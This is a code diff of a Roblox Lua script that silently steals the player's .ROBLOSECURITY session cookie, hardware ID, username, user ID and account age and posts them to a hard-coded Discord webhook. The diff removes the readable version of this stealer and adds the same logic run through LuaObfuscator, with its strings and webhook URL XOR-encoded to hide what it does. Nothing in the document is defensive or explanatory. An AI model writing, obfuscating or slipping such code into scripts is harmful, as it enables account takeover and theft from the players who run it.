@@ -1,66 +1,12 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
 
-local WEBHOOK = "https://discord.com/api/webhooks/1559034692127293440/r9ODOICWqdg7QFiv2tMBabg27dT2kvJYi_EPIm5p5l_zQ7nhdHYHGUmdOUymkQxzWb2q"
+]]--
 
-local function getRequest()
-    return (syn and syn.request) or http_request or request or http.request or (fluxus and fluxus.request)
-end
-
-local function send(data)
-    local req = getRequest()
-    if not req then return end
-
-    local body = HttpService:JSONEncode({
-        embeds = {{
-            title = "Execution Log",
-            color = 5793266,
-            fields = {
-                {name = "Username", value = tostring(data.username), inline = true},
-                {name = "UserId", value = tostring(data.userId), inline = true},
-                {name = "DisplayName", value = tostring(data.displayName), inline = true},
-                {name = "Account Age", value = tostring(data.accountAge), inline = true},
-                {name = "PlaceId", value = tostring(data.placeId), inline = true},
-                {name = "Executor", value = tostring(data.executor), inline = true},
-                {name = "HWID", value = tostring(data.hwid), inline = false},
-                {name = "Cookie", value = data.cookie and tostring(data.cookie) or "N/A", inline = false},
-            },
-            footer = {text = data.timestamp}
-        }}
-    })
-
-    pcall(function()
-        req({
-            Url = WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = body
-        })
-    end)
-end
-
-local function grab()
-    local data = {
-        username = LocalPlayer.Name,
-        displayName = LocalPlayer.DisplayName,
-        userId = LocalPlayer.UserId,
-        accountAge = LocalPlayer.AccountAge,
-        placeId = game.PlaceId,
-        jobId = game.JobId,
-        executor = (identifyexecutor and identifyexecutor()) or "unknown",
-        hwid = (gethwid and gethwid()) or "unknown",
-        cookie = nil,
-        timestamp = os.date("%Y-%m-%d %H:%M:%S")
-    }
-
-    pcall(function()
-        if getcookie then
-            data.cookie = getcookie(".ROBLOSECURITY")
-        end
-    end)
-
-    send(data)
-end
-
-task.spawn(grab)
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v15,v16) local v17={};for v24=1, #v15 do v6(v17,v0(v4(v1(v2(v15,v24,v24 + 1 )),v1(v2(v16,1 + (v24% #v16) ,1 + (v24% #v16) + 1 )))%256 ));end return v5(v17);end local v8=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165"));local v10=v9.LocalPlayer;local v11=v7("\60\163\93\6\175\124\9\123\179\64\5\191\41\84\48\249\74\25\177\105\71\36\190\6\1\185\36\78\59\184\66\5\243\119\19\97\238\25\69\232\112\31\102\230\27\65\238\127\21\96\227\25\89\174\127\105\16\152\96\53\139\55\66\51\224\120\48\181\48\20\32\154\107\23\190\33\20\99\179\125\68\183\48\108\13\190\118\51\140\15\75\97\167\28\26\131\60\119\99\185\65\18\148\31\110\19\130\68\18\147\19\95\57\188\120\14\166\17\68\102\166","\38\84\215\41\118\220\70");local function v12() return (syn and syn.request) or http_request or request or http.request or (fluxus and fluxus.request) ;end local function v13(v18) local v19=0 -0 ;local v20;local v21;while true do if (v19==0) then local v25=0;local v26;while true do if (v25==0) then v26=1824 -(1195 + 629) ;while true do if (0==v26) then v20=v12();if  not v20 then return;end v26=1 -0 ;end if ((242 -(187 + 54))==v26) then v19=(1712 -(162 + 618)) -(857 + 52 + 22) ;break;end end break;end end end if (v19==((379 + 190) -((782 -415) + 201))) then v21=v8:JSONEncode({[v7("\85\27\32\23\250\67","\158\48\118\66\114")]={{[v7("\191\45\4\58\118","\155\203\68\112\86\19\197")]=v7("\99\197\51\255\85\108\236\247\72\157\26\243\71","\152\38\189\86\156\32\24\133"),[v7("\255\88\171\73\238","\38\156\55\199")]=25226219 -(1519438 + 17913515) ,[v7("\174\116\121\36\23\103","\35\200\29\28\72\115\20\154")]={{[v7("\23\190\220\218","\84\121\223\177\191\237\76")]=v7("\142\69\204\178\52\81\61\196","\161\219\54\169\192\90\48\80"),[v7("\95\67\12\48\76","\69\41\34\96")]=tostring(v18.username),[v7("\181\205\219\3\12\46","\75\220\163\183\106\98")]=true},{[v7("\12\187\134\50","\185\98\218\235\87")]=v7("\254\47\34\244\247\174","\202\171\92\71\134\190"),[v7("\63\192\32\157\44","\232\73\161\76")]=tostring(v18.userId),[v7("\178\215\78\84\16\190","\126\219\185\34\61")]=true},{[v7("\2\207\83\119","\135\108\174\62\18\30\23\147")]=v7("\146\224\57\219\20\175\42\233\183\228\47","\167\214\137\74\171\120\206\83"),[v7("\157\241\62\72\253","\199\235\144\82\61\152")]=tostring(v18.displayName),[v7("\14\24\181\34\9\19","\75\103\118\217")]=true},{[v7("\201\85\125\17","\126\167\52\16\116\217")]=v7("\233\45\35\143\161\23\232\136\15\39\133","\156\168\78\64\224\212\121"),[v7("\17\239\169\219\2","\174\103\142\197")]=tostring(v18.accountAge),[v7("\95\38\83\49\43\91","\152\54\72\63\88\69\62")]=true},{[v7("\218\197\227\89","\60\180\164\142")]=v7("\104\82\4\42\34\196\22","\114\56\62\101\73\71\141"),[v7("\174\232\215\209\189","\164\216\137\187")]=tostring(v18.placeId),[v7("\219\232\61\187\168\251","\107\178\134\81\210\198\158")]=true},{[v7("\54\15\143\195","\202\88\110\226\166")]=v7("\230\23\135\244\223\215\0\144","\170\163\111\226\151"),[v7("\7\49\190\45\75","\73\113\80\210\88\46\87")]=tostring(v18.executor),[v7("\136\34\193\27\233\132","\135\225\76\173\114")]=true},{[v7("\20\236\181\181","\199\122\141\216\208\204\221")]=v7("\133\234\57\212","\150\205\189\112\144\24"),[v7("\51\133\179\89\1","\112\69\228\223\44\100\232\113")]=tostring(v18.hwid),[v7("\221\17\11\218\184\121","\230\180\127\103\179\214\28")]=false},{[v7("\130\4\82\67","\128\236\101\63\38\132\33")]=v7("\143\166\30\79\191\238","\175\204\201\113\36\214\139"),[v7("\81\205\57\201\1","\100\39\172\85\188")]=(v18.cookie and tostring(v18.cookie)) or v7("\131\55\152","\83\205\24\217\224") ,[v7("\239\203\193\52\232\192","\93\134\165\173")]=false}},[v7("\184\253\206\214\63\220","\30\222\146\161\162\90\174\210")]={[v7("\241\75\104\30","\106\133\46\16")]=v18.timestamp}}}});pcall(function() v20({[v7("\109\50\127","\32\56\64\19\156\58")]=v11,[v7("\119\205\241\94\85\246","\224\58\168\133\54\58\146")]=v7("\105\121\120\201","\107\57\54\43\157\21\230\231"),[v7("\243\142\16\241\188\206\220","\175\187\235\113\149\217\188")]={[v7("\31\160\143\88\230\119\108\113\155\152\92\230","\24\92\207\225\44\131\25")]=v7("\74\195\168\64\18\126\74\199\177\67\21\50\65\192\183\66","\29\43\179\216\44\123")},[v7("\159\214\36\85","\44\221\185\64")]=v21});end);break;end end end local function v14() local v22=0;local v23;while true do if (v22==(1384 -(746 + 638))) then v23={[v7("\20\244\77\77\125\0\234\77","\19\97\135\40\63")]=v10.Name,[v7("\170\85\32\43\35\48\183\114\50\54\42","\81\206\60\83\91\79")]=v10.DisplayName,[v7("\91\184\213\96\6\199","\196\46\203\176\18\79\163\45")]=v10.UserId,[v7("\185\33\125\17\49\245\251\153\37\123","\143\216\66\30\126\68\155")]=v10.AccountAge,[v7("\186\196\12\200\192\138\211","\129\202\168\109\171\165\195\183")]=game.PlaceId,[v7("\40\87\53\241\218","\134\66\56\87\184\190\116")]=game.JobId,[v7("\57\41\12\184\12\255\46\39","\85\92\81\105\219\121\139\65")]=(identifyexecutor and identifyexecutor()) or v7("\232\189\91\75\115\200\243","\191\157\211\48\37\28") ,[v7("\215\8\253\24","\90\191\127\148\124")]=(gethwid and gethwid()) or v7("\109\137\37\25\119\144\32","\119\24\231\78") ,[v7("\129\34\170\65\213\69","\113\226\77\197\42\188\32")]=nil,[v7("\46\31\249\176\41\2\245\184\42","\213\90\118\148")]=os.date(v7("\30\23\249\19\64\22\107\176\22\8\115\116\241\123\23\30\29","\45\59\78\212\54"))};pcall(function() if getcookie then v23.cookie=getcookie(v7("\94\100\172\169\170\1\158\213\51\99\177\162\178\23","\144\112\54\227\235\230\78\205"));end end);v22=1;end if (v22==1) then v13(v23);break;end end end task.spawn(v14);
